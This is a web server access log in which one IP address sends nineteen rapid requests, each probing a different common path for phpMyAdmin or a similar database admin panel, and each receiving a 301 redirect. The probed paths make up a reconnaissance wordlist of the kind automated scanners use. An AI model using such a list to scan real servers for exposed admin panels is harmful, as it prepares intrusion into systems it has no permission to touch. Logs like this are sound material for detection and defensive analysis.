70.83.6.196 - - [18/Oct/2021:11:46:50 +0200] "GET /phpmyAdmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:51 +0200] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:51 +0200] "GET /phpMyAdmin-5.1.1/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:51 +0200] "GET /phpmyadmin3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:51 +0200] "GET /phpMyAdmin-4.9.7-english/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:52 +0200] "GET /phpmyadmin2019/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:52 +0200] "GET /sql/phpmyadmin4/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:52 +0200] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:53 +0200] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:53 +0200] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:53 +0200] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:53 +0200] "GET /PMA2015/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:54 +0200] "GET /mysql/admin/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:54 +0200] "GET /pma2013/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:54 +0200] "GET /db/phpMyAdmin-3/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:54 +0200] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:55 +0200] "GET /program/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:55 +0200] "GET /phpMyAdmin-5/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
70.83.6.196 - - [18/Oct/2021:11:46:55 +0200] "GET /program/index.php?lang=en HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
